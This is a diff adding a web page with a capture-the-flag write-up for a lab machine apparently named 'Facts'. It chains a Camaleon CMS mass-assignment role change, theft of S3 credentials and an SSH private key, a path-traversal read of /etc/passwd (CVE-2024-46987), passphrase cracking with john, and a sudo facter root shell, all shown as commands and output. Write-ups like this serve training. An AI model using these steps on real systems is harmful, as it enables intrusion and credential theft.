+                <p>In other words, <code>permit!</code> allows <strong>any</strong> parameter to pass through the mass assignment filter, including sensitive fields like the user's role.</p>
+
+                <h2>Initial Access - Exploiting Mass Assignment</h2>
+                <p>I intercept the request with <code>Burpsuite</code> when trying to change my account's password. The request body is:</p>
+                <pre data-lang="http"><code><span class="var">_method</span>=<span class="val">patch</span>&amp;<span class="var">authenticity_token</span>=<span class="val">edF-xqESD-NYINKaH069TWnyjUHn5-Y62XUEtqOZ205qWAVU15FXWr8QFtQhFcDmSY91AWM5he3e2-24Z6lU2Q</span>&amp;<span class="var">password[password]</span>=<span class="val">asd</span>&amp;<span class="var">password[password_confirmation]</span>=<span class="val">asd</span></code></pre>
+
+                <p>To reproduce the vulnerability, I simply add the role parameter to the request body:</p>
+                <pre data-lang="http"><code><span class="var">_method</span>=<span class="val">patch</span>&amp;<span class="var">authenticity_token</span>=<span class="val">edF-xqESD-NYINKaH069TWnyjUHn5-Y62XUEtqOZ205qWAVU15FXWr8QFtQhFcDmSY91AWM5he3e2-24Z6lU2Q</span>&amp;<span class="var">password[password]</span>=<span class="val">asd</span>&amp;<span class="var">password[password_confirmation]</span>=<span class="val">asd</span>&amp;<span class="key">password[role]=admin</span></code></pre>
+
+                <p>After resending the modified request, my role has been successfully updated to <strong>administrator</strong>:</p>
+                <p><img src="./media/image2.png" alt="Updated user profile showing administrator role after exploiting Mass Assignment" /></p>
+
+                <h2>Admin Enumeration - AWS S3 Credentials</h2>
+                <p>Exploring the site configuration with my new administrator privileges, I discover AWS S3 credentials stored in the CMS settings:</p>
+                <pre data-lang="text"><code><span class="key">Aws s3 access key (*)</span>
+<span class="val">AKIA3B9D0AA45ABCDEAE</span>
+
+<span class="key">Aws s3 secret key (*)</span>
+<span class="val">wQVzCvmAXxWRwN8Vml9au3w7gXT29D1keJGJFS5x</span>
+
+<span class="key">Aws s3 bucket name (*)</span>
+<span class="val">randomfacts</span>
+
+<span class="key">Aws s3 region (*)</span>
+<span class="val">us-east-1</span>
+
+<span class="key">Aws s3 bucket endpoint</span>
+<span class="val">http://localhost:54321</span>
+
+<span class="key">Cloudfront url</span>
+<span class="url">http://facts.htb/randomfacts</span></code></pre>
+
+                <p>Now I understand the purpose of the service running on port <code>54321</code>: it's an S3-compatible service (likely MinIO or similar) used as the storage backend for the CMS.</p>
+
+                <h2>S3 Bucket Enumeration</h2>
+                <p>I configure the AWS credentials on my machine to interact with the S3 service:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">configure set</span> <span class="var">aws_access_key_id</span> <span class="val">AKIA3B9D0AA45ABCDEAE</span> <span class="flag">--profile</span>=<span class="val">xd</span>
+<span class="cmd">aws</span> <span class="param">configure set</span> <span class="var">aws_secret_access_key</span> <span class="val">wQVzCvmAXxWRwN8Vml9au3w7gXT29D1keJGJFS5x</span> <span class="flag">--profile</span>=<span class="val">xd</span></code></pre>
+
+                <p>I list the available buckets and discover that, besides the <code>randomfacts</code> bucket (which only contains the website's images), there's a much more interesting bucket called <code>internal</code>:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>2025-09-11 13:06:52 internal
+2025-09-11 13:06:52 randomfacts</code></pre>
+
+                <p>Listing the contents of the <code>internal</code> bucket, it appears to be a system user's home directory:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="str">s3://internal/</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+2026-01-08 18:45:13        220 .bash_logout
+2026-01-08 18:45:13       3900 .bashrc
+2026-01-08 18:47:17         20 .lesshst
+2026-01-08 18:47:17        807 .profile</code></pre>
+
+                <p>Most interesting is the <code>.ssh/</code> directory. Listing its contents reveals an SSH private key:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 ls</span> <span class="str">s3://internal/.ssh/</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>2026-02-01 18:37:03         82 authorized_keys
+2026-02-01 18:37:03        464 id_ed25519</code></pre>
+
+                <p>I download the private SSH key:</p>
+                <pre data-lang="bash"><code><span class="cmd">aws</span> <span class="param">s3 cp</span> <span class="str">s3://internal/.ssh/id_ed25519</span> <span class="path">./id_ed25519</span> <span class="flag">--endpoint-url</span> <span class="url">http://10.129.26.141:54321</span> <span class="flag">--region</span> <span class="val">us-east-1</span> <span class="flag">--profile</span> <span class="val">xd</span></code></pre>
+                <pre data-lang="output"><code>download: s3://internal/.ssh/id_ed25519 to ./id_ed25519</code></pre>
+
+                <p>I have the private key, but I don't know which user it belongs to. I try <code>admin</code>, which is the user I see in the CMS, but it doesn't work. I also download other files from the bucket trying to find the username, but it doesn't appear anywhere.</p>
+
+                <h2>Path Traversal - CVE-2024-46987</h2>
+                <p>Continuing my vulnerability research on Camaleon CMS, I discover a <strong>Path Traversal</strong> vulnerability that will allow me to read arbitrary files from the system: <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">CVE-2024-46987</a>.</p>
+
+                <p>The vulnerability is straightforward to exploit. I simply visit the following path with an admin session:</p>
+                <pre data-lang="http"><code><span class="kw">GET</span> <span class="path">/admin/media/download_private_file?file=../../../../../../etc/passwd</span></code></pre>
+
+                <p>The vulnerability occurs because the <code>file</code> parameter is passed directly to <code>fetch_file</code> without any sanitization:</p>
+                <pre data-lang="ruby"><code><span class="kw">def</span> <span class="func">download_private_file</span>
+  <span class="var">cama_uploader</span>.<span class="func">enable_private_mode!</span>
+  <span class="var">file</span> = <span class="var">cama_uploader</span>.<span class="func">fetch_file</span>(<span class="str">"private/#{params[:file]}"</span>)
+  <span class="func">send_file</span> <span class="var">file</span>, <span class="key">disposition:</span> <span class="str">'inline'</span>
+<span class="kw">end</span></code></pre>
+
+                <p>From the response, I extract the system users with bash shell access:</p>
+                <pre data-lang="output"><code><span class="user">root</span>:x:0:0:root:<span class="path">/root</span>:<span class="path">/bin/bash</span>
+<span class="user">trivia</span>:x:1000:1000:facts.htb:<span class="path">/home/trivia</span>:<span class="path">/bin/bash</span>
+<span class="user">william</span>:x:1001:1001::<span class="path">/home/william</span>:<span class="path">/bin/bash</span></code></pre>
+
+                <h2>SSH Passphrase Cracking and Access as Trivia</h2>
+                <p>I attempt to connect using the downloaded SSH key as the <code>trivia</code> user, but the key is protected with a passphrase:</p>
+                <pre data-lang="bash"><code><span class="cmd">ssh</span> <span class="flag">-i</span> <span class="path">id_ed25519</span> <span class="user">trivia</span>@<span class="url">facts.htb</span></code></pre>
+                <pre data-lang="output"><code>Enter passphrase for key 'id_ed25519':</code></pre>
+
+                <p>I use <code>ssh2john</code> to extract the key hash and <code>john</code> with the <code>rockyou.txt</code> dictionary to crack the passphrase:</p>
+                <pre data-lang="bash"><code><span class="cmd">ssh2john</span> <span class="path">id_ed25519</span> &gt; <span class="path">id_ed25519.hash</span>
+<span class="cmd">john</span> <span class="flag">--wordlist</span>=<span class="path">/usr/share/wordlists/rockyou.txt</span> <span class="path">id_ed25519.hash</span></code></pre>
+                <pre data-lang="output"><code><span class="str">dragonballz</span> (id_ed25519)</code></pre>
+
+                <p>With the passphrase <code>dragonballz</code>, I successfully connect as <code>trivia</code> and obtain the user flag, which is located in <code>william</code>'s home directory but <code>trivia</code> has read permissions on it.</p>
+
+                <h2>Privilege Escalation - Ruby Facter</h2>
+                <p>Once inside, I check the <code>sudo</code> privileges for the <code>trivia</code> user:</p>
+                <pre data-lang="bash"><code><span class="cmd">sudo</span> <span class="flag">-l</span></code></pre>
+                <pre data-lang="output"><code>Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter</code></pre>
+
+                <p>The <code>trivia</code> user can execute <code>/usr/bin/facter</code> as root without a password. <code>Facter</code> is a Ruby-based system profiling tool, and according to <a href="https://gtfobins.org/gtfobins/facter/">GTFOBins</a>, it allows executing arbitrary Ruby scripts.</p>
+
+                <p>To exploit this, I create a directory in <code>/tmp</code> with a Ruby script that spawns a shell, following the technique documented at <a href="https://gtfobins.org/gtfobins/ruby/#shell">GTFOBins for Ruby</a>:</p>
+                <pre data-lang="ruby"><code><span class="comment"># /tmp/facter/xd.rb</span>
+<span class="func">exec</span> <span class="str">"/bin/sh"</span></code></pre>
+
+                <p>By specifying the custom facter directory via the <code>--custom-dir</code> option, I obtain root access:</p>
+                <pre data-lang="bash"><code><span class="cmd">sudo</span> <span class="path">facter</span> <span class="flag">--custom-dir</span>=<span class="path">/tmp/facter</span></code></pre>
+                <pre data-lang="output"><code># <span class="cmd">whoami</span>
+<span class="user">root</span></code></pre>
+
+                <p>With this, I've gained full access to the system as <code>root</code> and can retrieve the root flag.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
